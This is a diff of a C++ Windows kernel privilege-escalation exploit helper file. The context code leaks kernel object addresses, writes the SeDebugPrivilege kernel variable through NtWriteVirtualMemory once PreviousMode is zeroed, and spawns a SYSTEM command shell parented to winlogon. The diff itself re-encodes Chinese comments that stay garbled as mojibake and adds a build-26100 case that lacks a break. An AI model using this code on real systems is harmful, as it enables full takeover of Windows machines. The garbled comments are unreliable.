@@ -38,11 +38,11 @@
 
 #define OFFSET_KPROCESS 0x220  //dt nt!_kthread +0x220 Process          : Ptr64 _KPROCESS
 #define OFFSET_KPREVIOUSMODE 0x232 //dt nt!_kthread +0x232 +0x232 PreviousMode     : Char
-#define WS_PAGEDATA 0xd45000; //PAGEDATA Ïà¶Ô nt µÄÆ«ÒÆ
+#define WS_PAGEDATA 0xd45000; //PAGEDATA ç›¸å¯¹ nt çš„åç§»
 
 //typedef struct _UNICODE_STRING {
-//  USHORT Length; //2×Ö½Ú
-//  USHORT MaximumLength; //2×Ö½Ú
+//  USHORT Length; //2å­—èŠ‚
+//  USHORT MaximumLength; //2å­—èŠ‚
 //  PWSTR  Buffer;
 //} UNICODE_STRING, * PUNICODE_STRING;
 
@@ -100,7 +100,7 @@ typedef struct SYSTEM_MODULE_INFORMATION {
 } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
 
 
-// NtQuerySystemInformation º¯ÊıÉùÃ÷
+// NtQuerySystemInformation å‡½æ•°å£°æ˜
 typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
     __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
     __inout PVOID SystemInformation,
@@ -108,22 +108,22 @@ typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
     __out_opt PULONG ReturnLength
     );
 typedef NTSTATUS NtQueryInformationToken(
-    HANDLE                  TokenHandle, //Òª²éÑ¯µÄÁîÅÆµÄ¾ä±ú
-    TOKEN_INFORMATION_CLASS TokenInformationClass,//Ò»¸öÃ¶¾ÙÖµ£¬Ö¸¶¨Òª²éÑ¯µÄÁîÅÆĞÅÏ¢µÄÀàĞÍ
-    PVOID                   TokenInformation, //Ö¸Ïò»º³åÇøµÄÖ¸Õë£¬¸Ã»º³åÇøÓÃÓÚ½ÓÊÕ²éÑ¯µ½µÄĞÅÏ¢¡£
-    ULONG                   TokenInformationLength, //»º³åÇøµÄ³¤¶È£¬ÒÔ×Ö½ÚÎªµ¥Î»
-    PULONG                  ReturnLength //Ö¸ÏòÒ»¸ö±äÁ¿µÄÖ¸Õë£¬¸Ã±äÁ¿½ÓÊÕÊµ¼Ê·µ»ØµÄÁîÅÆĞÅÏ¢³¤¶È
+    HANDLE                  TokenHandle, //è¦æŸ¥è¯¢çš„ä»¤ç‰Œçš„å¥æŸ„
+    TOKEN_INFORMATION_CLASS TokenInformationClass,//ä¸€ä¸ªæšä¸¾å€¼ï¼ŒæŒ‡å®šè¦æŸ¥è¯¢çš„ä»¤ç‰Œä¿¡æ¯çš„ç±»å‹
+    PVOID                   TokenInformation, //æŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œè¯¥ç¼“å†²åŒºç”¨äºæ¥æ”¶æŸ¥è¯¢åˆ°çš„ä¿¡æ¯ã€‚
+    ULONG                   TokenInformationLength, //ç¼“å†²åŒºçš„é•¿åº¦ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½
+    PULONG                  ReturnLength //æŒ‡å‘ä¸€ä¸ªå˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡æ¥æ”¶å®é™…è¿”å›çš„ä»¤ç‰Œä¿¡æ¯é•¿åº¦
 );
 
-// NtWriteVirtualMemory ½«Êı¾İĞ´ÈëÖ¸¶¨½ø³ÌµÄĞéÄâµØÖ·¿Õ¼ä
+// NtWriteVirtualMemory å°†æ•°æ®å†™å…¥æŒ‡å®šè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´
 typedef NTSTATUS(*pNtWriteVirtualMemory)(
-    IN HANDLE               ProcessHandle, //ÒªĞ´ÈëÄÚ´æµÄ½ø³Ì¾ä±ú
+    IN HANDLE               ProcessHandle, //è¦å†™å…¥å†…å­˜çš„è¿›ç¨‹å¥æŸ„
     IN PVOID                BaseAddress,
     IN PVOID                Buffer,
     IN ULONG                NumberOfBytesToWrite,
     OUT PULONG              NumberOfBytesWritten OPTIONAL
     );
-// NtReadVirtualMemory ¶ÁÈ¡Ö¸¶¨½ø³ÌµÄĞéÄâµØÖ·¿Õ¼äÊı¾İµ½»º³åÇø
+// NtReadVirtualMemory è¯»å–æŒ‡å®šè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ•°æ®åˆ°ç¼“å†²åŒº
 typedef NTSTATUS(*pNtReadVirtualMemory)(
     IN HANDLE               ProcessHandle,
     IN PVOID                BaseAddress,
@@ -134,7 +134,7 @@ typedef NTSTATUS(*pNtReadVirtualMemory)(
 pNtWriteVirtualMemory NtWriteVirtualMemory;
 pNtReadVirtualMemory NtReadVirtualMemory;
 
-// ¶¨ÒåÏµÍ³°æ±¾ĞÅÏ¢½á¹¹Ìå
+// å®šä¹‰ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ç»“æ„ä½“
 typedef struct OSVERSION {
     DWORD MajorVersion;
     DWORD MinorVersion;
@@ -153,11 +153,11 @@ LPCSTR NtoRootPath = "\\SystemRoot\\system32\\ntoskrnl.exe";
 void ErrorStatusInfo(LPCSTR ErrorMsg, int error)
 {
     printf("[-] %s\n", ErrorMsg);
-    printf("    ©¸©¤©¤> %d\n", error);
+    printf("    â””â”€â”€> %d\n", error);
 }
 
 
-// Í¨¹ı¾ä±ú¡¢½ø³ÌID»ñÈ¡ÄÚºË¶ÔÏóÖ¸Õë
+// é€šè¿‡å¥æŸ„ã€è¿›ç¨‹IDè·å–å†…æ ¸å¯¹è±¡æŒ‡é’ˆ
 PVOID GetKernelPointerByHandle(HANDLE HandleValue, DWORD ProcPid)
 {
     HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
@@ -187,19 +187,19 @@ PVOID GetKernelPointerByHandle(HANDLE HandleValue, DWORD ProcPid)
 
         status = query(
             (SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, pHandleInfo, len, &len);
-        // STATEINFO_LENGTH_MISMATCH ±íÊ¾»º³åÇøÌ«Ğ¡£¬Òò´ËÖØÊÔ
+        // STATEINFO_LENGTH_MISMATCH è¡¨ç¤ºç¼“å†²åŒºå¤ªå°ï¼Œå› æ­¤é‡è¯•
         if (status == (NTSTATUS)0xc0000004) {
             continue;
         }
 
-        // ´¦ÀíÈÎºÎÆäËû´íÎó´úÂë
+        // å¤„ç†ä»»ä½•å…¶ä»–é”™è¯¯ä»£ç 
         if (status != 0) {
             ErrorStatusInfo("NtQuerySystemInformation failed.", GetLastError());
             GlobalFree(pHandleInfo);
             return NULL;
         }
 
-        // ÔÚ·µ»ØµÄ¾ä±úÁĞ±íÖĞËÑË÷¾ä±ú
+        // åœ¨è¿”å›çš„å¥æŸ„åˆ—è¡¨ä¸­æœç´¢å¥æŸ„
         for (int i = 0; i < pHandleInfo->HandleCount; i++) 
         {
             PVOID object = pHandleInfo->Handles[i].Object;
@@ -212,13 +212,13 @@ PVOID GetKernelPointerByHandle(HANDLE HandleValue, DWORD ProcPid)
             }
         }
 
-    } while (status == (NTSTATUS)0xc0000004);  // Èç¹û»º³åÇøÌ«Ğ¡£¬¼ÌĞøÖØÊÔ
+    } while (status == (NTSTATUS)0xc0000004);  // å¦‚æœç¼“å†²åŒºå¤ªå°ï¼Œç»§ç»­é‡è¯•
 
     GlobalFree(pHandleInfo);
     return NULL;
 }
 
-// Í¨¹ı½ø³ÌÃû»ñÈ¡ pid
+// é€šè¿‡è¿›ç¨‹åè·å– pid
 ULONG GetPidByName(LPCWSTR ProcName)
 {
     PROCESSENTRY32 entry;
@@ -241,8 +241,8 @@ ULONG GetPidByName(LPCWSTR ProcName)
 }
 
 
-// ´´½¨ÎÄ¼ş¶ÔÏó·µ»Ø¾ä±ú
-// Èç¹ûÎÄ¼ş´æÔÚ£¬Ôò´ò¿ªÎÄ¼ş; Èç¹ûÎÄ¼ş²»´æÔÚ£¬Ôò´´½¨ĞÂÎÄ¼ş
+// åˆ›å»ºæ–‡ä»¶å¯¹è±¡è¿”å›å¥æŸ„
+// å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™æ‰“å¼€æ–‡ä»¶; å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–°æ–‡ä»¶
 HANDLE CreatFileObject(LPCWSTR FilePath)
 {
     HANDLE hFileObject = CreateFileW(FilePath,
@@ -260,13 +260,13 @@ HANDLE CreatFileObject(LPCWSTR FilePath)
     return hFileObject;
 }
 
-// ¼ÓÔØÒ»¸öÄ£¿é²¢·µ»ØÒ»¸öÄ£¿é¾ä±ú£¨ÓÃ»§Ì¬µØÖ·£©ĞèÒªÓÃ FreeLibrary(NTOUserBase); ÊÍ·Å
+// åŠ è½½ä¸€ä¸ªæ¨¡å—å¹¶è¿”å›ä¸€ä¸ªæ¨¡å—å¥æŸ„ï¼ˆç”¨æˆ·æ€åœ°å€ï¼‰éœ€è¦ç”¨ FreeLibrary(NTOUserBase); é‡Šæ”¾
 // L"ntoskrnl.exe"
 HMODULE GetModuleByName(LPCWSTR ModName)
 {
     // hKern = LoadLibraryEx(ModName, NULL, DONT_RESOLVE_DLL_REFERENCES);
-    // Ê¹ÓÃ LoadLibraryEx ¼ÓÔØÄ£¿é£¬Èç¹ûĞèÒª½âÎö·ûºÅÔòÈ¥µô DONT_RESOLVE_DLL_REFERENCES ±êÖ¾
-    HMODULE hMod = LoadLibraryEx(ModName, NULL, 0);  // È¥µô DONT_RESOLVE_DLL_REFERENCES ±êÖ¾
+    // ä½¿ç”¨ LoadLibraryEx åŠ è½½æ¨¡å—ï¼Œå¦‚æœéœ€è¦è§£æç¬¦å·åˆ™å»æ‰ DONT_RESOLVE_DLL_REFERENCES æ ‡å¿—
+    HMODULE hMod = LoadLibraryEx(ModName, NULL, 0);  // å»æ‰ DONT_RESOLVE_DLL_REFERENCES æ ‡å¿—
     if (!hMod) {
         ErrorStatusInfo("Failed to obtain module.", GetLastError());
         return NULL;
@@ -275,7 +275,7 @@ HMODULE GetModuleByName(LPCWSTR ModName)
 }
 
 
-// Í¨¹ıÄ£¿éÃû»ñÈ¡Ä£¿éÄÚºË»ùµØÖ·
+// é€šè¿‡æ¨¡å—åè·å–æ¨¡å—å†…æ ¸åŸºåœ°å€
 DWORD64 GetModuleAddrByName(LPCSTR ModName)
 {
     PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);
@@ -311,7 +311,7 @@ DWORD64 GetModuleAddrByName(LPCSTR ModName)
 }
 
 
-// Í¨¹ıÄ£¿é¾ä±ú£¬º¯ÊıÃû»ñÈ¡º¯ÊıµØÖ·£¨·ÇÄÚºËÄ£¿é¾ä±ú£©
+// é€šè¿‡æ¨¡å—å¥æŸ„ï¼Œå‡½æ•°åè·å–å‡½æ•°åœ°å€ï¼ˆéå†…æ ¸æ¨¡å—å¥æŸ„ï¼‰
 FARPROC GetFunAddrByModule(HMODULE Mod, const char* FunName)
 {
     FARPROC FunAddr = GetProcAddress(Mod, FunName);
@@ -322,8 +322,8 @@ FARPROC GetFunAddrByModule(HMODULE Mod, const char* FunName)
     return FunAddr;
 }
 
-// Í¨¹ıÌá¹©µÄ¾ä±ú£¨HANDLE£©²éÕÒ²¢·µ»ØÓë¸Ã¾ä±ú¹ØÁªµÄÄÚºË¶ÔÏóµÄÖ¸Õë
-// ²¢ÇÒ¼ì²é¾ä±úµÄ¶ÔÏóÀàĞÍÊÇ·ñÓëÌá¹©µÄ type ²ÎÊıÏà·û
+// é€šè¿‡æä¾›çš„å¥æŸ„ï¼ˆHANDLEï¼‰æŸ¥æ‰¾å¹¶è¿”å›ä¸è¯¥å¥æŸ„å…³è”çš„å†…æ ¸å¯¹è±¡çš„æŒ‡é’ˆ
+// å¹¶ä¸”æ£€æŸ¥å¥æŸ„çš„å¯¹è±¡ç±»å‹æ˜¯å¦ä¸æä¾›çš„ type å‚æ•°ç›¸ç¬¦
 DWORD64 GetKernelPointer(HANDLE handle, DWORD type, DWORD ProcPid)
 {
     PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);
@@ -349,7 +349,7 @@ DWORD64 GetKernelPointer(HANDLE handle, DWORD type, DWORD ProcPid)
         if (buffer->Handles[i].ProcessId == ProcPid 
             && buffer->Handles[i].ObjectTypeNumber == type)
         {
-            // Ìí¼ÓÒÔ»ñÈ¡Ëæ»ú¶ÔÏóÖ¸Õë
+            // æ·»åŠ ä»¥è·å–éšæœºå¯¹è±¡æŒ‡é’ˆ
             if (!handle) {
                 printf("   [*] Objdect: %llx ObjectType: %d Handles: %x\n",
                     buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
@@ -370,7 +370,7 @@ DWORD64 GetKernelPointer(HANDLE handle, DWORD type, DWORD ProcPid)
     return 0;
 }
 
-// Í¨¹ı½ø³Ì pid »ñµÃÒ»¸ö¿ÉÓÃµÄÎÄ¼ş¶ÔÏó 
+// é€šè¿‡è¿›ç¨‹ pid è·å¾—ä¸€ä¸ªå¯ç”¨çš„æ–‡ä»¶å¯¹è±¡ 
 // win10 ObjectType 37 ws2022 ObjectType 39
 DWORD64 GetFileObjKernelPointer(DWORD ProcPid)
 {
@@ -396,7 +396,7 @@ DWORD64 GetFileObjKernelPointer(DWORD ProcPid)
     for (size_t i = 0; i < buffer->NumberOfHandles; i++)
     {
         DWORD objTypeNumber = buffer->Handles[i].ObjectTypeNumber;
-        // \Device\ConDrv ÊÇÒ»¸ö¿ÉÓÃµÄÎÄ¼ş¶ÔÏó Handle µÈÓÚ4
+        // \Device\ConDrv æ˜¯ä¸€ä¸ªå¯ç”¨çš„æ–‡ä»¶å¯¹è±¡ Handle ç­‰äº4
         if (buffer->Handles[i].ProcessId == ProcPid && buffer->Handles[i].Handle == 4) {
             printf("   [*] Objdect: %llx ObjectType: %d Handles: %x\n",
                 buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
@@ -410,7 +410,7 @@ DWORD64 GetFileObjKernelPointer(DWORD ProcPid)
     return 0;
 }
 
-// Í¨¹ı pattern ²éÕÒ¶Î
+// é€šè¿‡ pattern æŸ¥æ‰¾æ®µ
 BOOL ScanSectionForPattern(HANDLE hProcess,
     LPVOID lpBaseAddress, SIZE_T dwSize, BYTE* pattern, SIZE_T patternSize, LPVOID* lpFoundAddress)
 {
@@ -447,7 +447,7 @@ BOOL ScanSectionForPattern(HANDLE hProcess,
     return FALSE;
 }
 
-// Í¨¹ı×Ö½ÚĞòÁĞ²éÕÒÖ¸¶¨Ä£¿é¾ä±úµÄº¯Êı
+// é€šè¿‡å­—èŠ‚åºåˆ—æŸ¥æ‰¾æŒ‡å®šæ¨¡å—å¥æŸ„çš„å‡½æ•°
 UINT_PTR FindPattern(HMODULE hModule, BYTE* pattern, SIZE_T patternSize)
 {
     UINT_PTR relativeOffset = 0;
@@ -466,7 +466,7 @@ UINT_PTR FindPattern(HMODULE hModule, BYTE* pattern, SIZE_T patternSize)
 
             if (ScanSectionForPattern(
                 GetCurrentProcess(), lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)){
-                // ¼ÆËãÏà¶ÔÆ«ÒÆÁ¿
+                // è®¡ç®—ç›¸å¯¹åç§»é‡
                 relativeOffset = (UINT_PTR)lpFoundAddress - (UINT_PTR)hModule;
             }
 
@@ -480,7 +480,7 @@ UINT_PTR FindPattern(HMODULE hModule, BYTE* pattern, SIZE_T patternSize)
 
 
 typedef LONG(WINAPI* RtlGetVersionFunc)(PRTL_OSVERSIONINFOW);
-// ´Ó×¢²á±íÖĞ¶ÁÈ¡ UBR ĞŞ²¹°æ±¾
+// ä»æ³¨å†Œè¡¨ä¸­è¯»å– UBR ä¿®è¡¥ç‰ˆæœ¬
 DWORD GetOSRevisionNumber()
 {
     HKEY hKey;
@@ -508,7 +508,7 @@ DWORD GetOSRevisionNumber()
 //printf("[*] OS Minor Version: %d\n", OSVersion->MinorVersion);
 //printf("[*] OS Build Number: %d\n", OSVersion->BuildNumber);
 //printf("[*] OS Revision Number: %d\n", OSVersion->RevisionNumber);
-// »ñÈ¡ÍêÕûÏµÍ³°æ±¾ĞÅÏ¢£ºÖ÷Òª°æ±¾¡¢´ÎÒª°æ±¾¡¢ÄÚ²¿°æ±¾¡¢ĞŞ²¹°æ±¾
+// è·å–å®Œæ•´ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ï¼šä¸»è¦ç‰ˆæœ¬ã€æ¬¡è¦ç‰ˆæœ¬ã€å†…éƒ¨ç‰ˆæœ¬ã€ä¿®è¡¥ç‰ˆæœ¬
 void GetFullOSVersion(OSVERSION* OSVersion)
 {
     HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
@@ -533,20 +533,20 @@ void GetFullOSVersion(OSVERSION* OSVersion)
     }
 }
 
-// Í¨¹ı½ø³Ì¾ä±úÉèÖÃ¸Ä¾ä±úÎª LocalService ÁîÅÆ£¬ĞèÒª¹ÜÀíÔ±È¨ÏŞ
+// é€šè¿‡è¿›ç¨‹å¥æŸ„è®¾ç½®æ”¹å¥æŸ„ä¸º LocalService ä»¤ç‰Œï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™
 BOOL SetProcessTokenToLocalService(HANDLE hProcess)
 {
     HANDLE hProcessToken = NULL;
     HANDLE hLocalServiceToken = NULL;
     BOOL result = FALSE;
 
-    // 1. ´ò¿ªÖ¸¶¨½ø³ÌµÄ·ÃÎÊÁîÅÆ
+    // 1. æ‰“å¼€æŒ‡å®šè¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œ
     if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hProcessToken)) {
         ErrorStatusInfo("Failed to open process token.", GetLastError());
         return FALSE;
     }
 
-    // 2. Ê¹ÓÃ LogonUser º¯ÊıÀ´Ä£Äâ Local Service ÕÊ»§
+    // 2. ä½¿ç”¨ LogonUser å‡½æ•°æ¥æ¨¡æ‹Ÿ Local Service å¸æˆ·
     if (!LogonUserW(L"LocalService", L"NT AUTHORITY", NULL,
         LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT, &hLocalServiceToken)) {
         ErrorStatusInfo("Failed to log on as LOCAL SERVICE.", GetLastError());
@@ -554,7 +554,7 @@ BOOL SetProcessTokenToLocalService(HANDLE hProcess)
         return FALSE;
     }
 
-    // 3. ´´½¨Ò»¸öĞÂµÄÖ÷ÁîÅÆ£¬²¢ÉèÖÃÎª Local Service ÕÊ»§
+    // 3. åˆ›å»ºä¸€ä¸ªæ–°çš„ä¸»ä»¤ç‰Œï¼Œå¹¶è®¾ç½®ä¸º Local Service å¸æˆ·
     HANDLE hNewToken = NULL;
     if (!DuplicateTokenEx(hLocalServiceToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY,
         NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
@@ -568,7 +568,7 @@ BOOL SetProcessTokenToLocalService(HANDLE hProcess)
         result = TRUE;
     }
 
-    // ÇåÀí¾ä±ú
+    // æ¸…ç†å¥æŸ„
     CloseHandle(hLocalServiceToken);
     CloseHandle(hNewToken);
     CloseHandle(hProcessToken);
@@ -576,7 +576,7 @@ BOOL SetProcessTokenToLocalService(HANDLE hProcess)
     return result;
 }
 
-// ÆôÓÃ Privilege£¬ĞèÒª¹ÜÀíÔ±È¨ÏŞ
+// å¯ç”¨ Privilegeï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™
 BOOL EnablePrivilege(HANDLE hProcess, LPCWSTR PrivilegeValue) {
     HANDLE hToken;
     TOKEN_PRIVILEGES tp;
@@ -610,15 +610,15 @@ BOOL EnablePrivilege(HANDLE hProcess, LPCWSTR PrivilegeValue) {
 
 int SetProcessTokenToLocalServiceTest()
 {
-    // ´ò¿ª LocalService ÁîÅÆ
+    // æ‰“å¼€ LocalService ä»¤ç‰Œ
     HANDLE hToken = NULL;
     HANDLE hDupToken = NULL;
     TOKEN_PRIVILEGES priv = { 0 };
 
-    // »ñÈ¡ LocalService µÄÁîÅÆ
-    LPTSTR lpSystemName = NULL; // ±¾µØÏµÍ³
+    // è·å– LocalService çš„ä»¤ç‰Œ
+    LPTSTR lpSystemName = NULL; // æœ¬åœ°ç³»ç»Ÿ
     LPCWSTR lpUsername = TEXT("NT AUTHORITY\\LocalService");
-    WCHAR lpPassword[64] = { 0 }; // LocalService ²»ĞèÒªÃÜÂë
+    WCHAR lpPassword[64] = { 0 }; // LocalService ä¸éœ€è¦å¯†ç 
     DWORD dwLogonFlags = LOGON_WITH_PROFILE;
     DWORD dwLogonType = LOGON32_LOGON_SERVICE;
     DWORD dwLogonProvider = LOGON32_PROVIDER_DEFAULT;
@@ -628,17 +628,17 @@ int SetProcessTokenToLocalServiceTest()
         return 1;
     }
 
-    // ¸´ÖÆÁîÅÆ
+    // å¤åˆ¶ä»¤ç‰Œ
     if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
         ErrorStatusInfo("DuplicateTokenEx failed.", GetLastError());
         CloseHandle(hToken);
         return 1;
     }
 
-    // ¹Ø±ÕÔ­Ê¼ÁîÅÆ
+    // å…³é—­åŸå§‹ä»¤ç‰Œ
     CloseHandle(hToken);
 
-    // ÉèÖÃĞÂÁîÅÆµÄÈ¨ÏŞ
+    // è®¾ç½®æ–°ä»¤ç‰Œçš„æƒé™
     priv.PrivilegeCount = 1;
     priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid)) {
@@ -653,7 +653,7 @@ int SetProcessTokenToLocalServiceTest()
         return 1;
     }
 
-    // ÉèÖÃ½ø³ÌÁîÅÆ
+    // è®¾ç½®è¿›ç¨‹ä»¤ç‰Œ
     if (!SetThreadToken(NULL, hDupToken)) {
         ErrorStatusInfo("SetThreadToken failed.", GetLastError());
         CloseHandle(hDupToken);
@@ -663,13 +663,13 @@ int SetProcessTokenToLocalServiceTest()
     //std::cout << "Token successfully changed to LocalService." << std::endl;
     printf("[+] Token successfully changed to LocalService.\n");
 
-    // ÊÍ·ÅÁîÅÆ¾ä±ú
+    // é‡Šæ”¾ä»¤ç‰Œå¥æŸ„
     CloseHandle(hDupToken);
 
     return 0;
 }
 
-// »ñÈ¡ CPU ºËĞÄÊı
+// è·å– CPU æ ¸å¿ƒæ•°
 int GetCoreCount()
 {
     SYSTEM_INFO sysinfo;
@@ -679,7 +679,7 @@ int GetCoreCount()
 
 
 
-// ´´½¨Ïß³ÌÍ¨¹ı¾ä±úºÍÃüÁî
+// åˆ›å»ºçº¿ç¨‹é€šè¿‡å¥æŸ„å’Œå‘½ä»¤
 DWORD CreateProcFromHandleCommand(HANDLE Handle, LPWSTR Command) {
     STARTUPINFOEXA si;
     PROCESS_INFORMATION pi;
@@ -724,7 +724,7 @@ DWORD CreateProcFromHandleCommand(HANDLE Handle, LPWSTR Command) {
     return 0;
 }
 
-// ´´½¨ cmd Ïß³ÌÍ¨¹ı¾ä±ú
+// åˆ›å»º cmd çº¿ç¨‹é€šè¿‡å¥æŸ„
 void CreateCmdProcFromHandle(HANDLE hProcess) {
     int error;
     BOOL status;
@@ -804,8 +804,8 @@ void CreateCmdProcFromHandle(HANDLE hProcess) {
         else
         {
             printf("[+] New process created successfully.\n");
-            printf("    ©À©¤©¤> PID : %lu\n", pi.dwProcessId);
-            printf("    ©¸©¤©¤> TID : %lu\n", pi.dwThreadId);
+            printf("    â”œâ”€â”€> PID : %lu\n", pi.dwProcessId);
+            printf("    â””â”€â”€> TID : %lu\n", pi.dwThreadId);
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
         }
@@ -818,7 +818,7 @@ void CreateCmdProcFromHandle(HANDLE hProcess) {
     if (si.lpAttributeList != NULL)
         HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
 }
-// µ¯³ö CMD
+// å¼¹å‡º CMD
 int spwan_cmd_system()
 {
     DWORD winlogonPID;
@@ -842,7 +842,7 @@ int spwan_cmd_system()
     return 0;
 }
 
-// ĞŞ¸Ä SeDebugPrivilege ÄÚºË±äÁ¿ÖµÎª 0x17 ¼´¿ÉÌáÈ¨£¨Ç°ÌáÊÇ PreviousMode Îª0£©
+// ä¿®æ”¹ SeDebugPrivilege å†…æ ¸å˜é‡å€¼ä¸º 0x17 å³å¯ææƒï¼ˆå‰ææ˜¯ PreviousMode ä¸º0ï¼‰
 void WSeDebugPrivilege(HANDLE hProc, ULONGLONG SeDebugPrivilegeAddr)
 {
     ULONGLONG DebugPrivilege = 0x17;
@@ -850,12 +850,12 @@ void WSeDebugPrivilege(HANDLE hProc, ULONGLONG SeDebugPrivilegeAddr)
 }
 void WSeDebugPrivilegeSelfProc(ULONGLONG SeDebugPrivilegeAddr)
 {
-    HANDLE hProc = GetCurrentProcess(); //µ±Ç°Ïß³Ì¾ä±ú
+    HANDLE hProc = GetCurrentProcess(); //å½“å‰çº¿ç¨‹å¥æŸ„
     ULONGLONG DebugPrivilege = 0x17;
     NtWriteVirtualMemory(hProc, (PVOID)(SeDebugPrivilegeAddr), &DebugPrivilege, 8, 0);
 }
 
-// »ñÈ¡ ntoskrnl.exe PE ½á¹¹ÖĞÖĞ PAGEDATA ¶ÎµÄÆğÊ¼µØÖ·¡£
+// è·å– ntoskrnl.exe PE ç»“æ„ä¸­ä¸­ PAGEDATA æ®µçš„èµ·å§‹åœ°å€ã€‚
 // DWORD baseAddress = GetPagedataSectionBaseAddress(filePath);
 DWORD GetPagedataSectionBaseAddress(LPCWSTR filePath)
 {
@@ -880,24 +880,24 @@ DWORD GetPagedataSectionBaseAddress(LPCWSTR filePath)
     }
     CloseHandle(hFile);
 
-    // ¼ì²é DOS Í·
+    // æ£€æŸ¥ DOS å¤´
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;
     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
         delete[] buffer;
         return 0;
     }
 
-    // Ìøµ½ PE Í·
+    // è·³åˆ° PE å¤´
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(buffer + pDosHeader->e_lfanew);
     if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
         delete[] buffer;
         return 0;
     }
 
-    // »ñÈ¡½Ú±í
+    // è·å–èŠ‚è¡¨
     PIMAGE_SECTION_HEADER pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);
 
-    // ±éÀú½Ú±íÑ°ÕÒ PAGEDATA ½Ú
+    // éå†èŠ‚è¡¨å¯»æ‰¾ PAGEDATA èŠ‚
     for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) 
     {
         if (memcmp(pSectionHeaders[i].Name, "PAGEDATA", 8) == 0) {
@@ -908,7 +908,7 @@ DWORD GetPagedataSectionBaseAddress(LPCWSTR filePath)
     }
 
     delete[] buffer;
-    return 0; // Èç¹ûÃ»ÓĞÕÒµ½PAGEDATA½Ú£¬·µ»Ø0
+    return 0; // å¦‚æœæ²¡æœ‰æ‰¾åˆ°PAGEDATAèŠ‚ï¼Œè¿”å›0
 }
 
 
@@ -948,7 +948,8 @@ void SetNtSeDebugPrivilegeOffsetByOSVersion(OSVERSION& OSVersion,
             }
             break;
         case 22000: std::wcout << L"  Windows 10 21H2 / Windows 11" << std::endl; break;
-        case 22631: std::wcout << L"  Windows 10 23H2 / Windows 11" << std::endl;
+        case 22631: std::wcout << L"  Windows 10 23H2 / Windows 11" << std::endl; break;
+        case 26100: std::wcout << L"  Windows Server 2025" << std::endl;
         default: std::wcout << L"  Unknown Windows 10 version" << std::endl; break;
         }
         break;
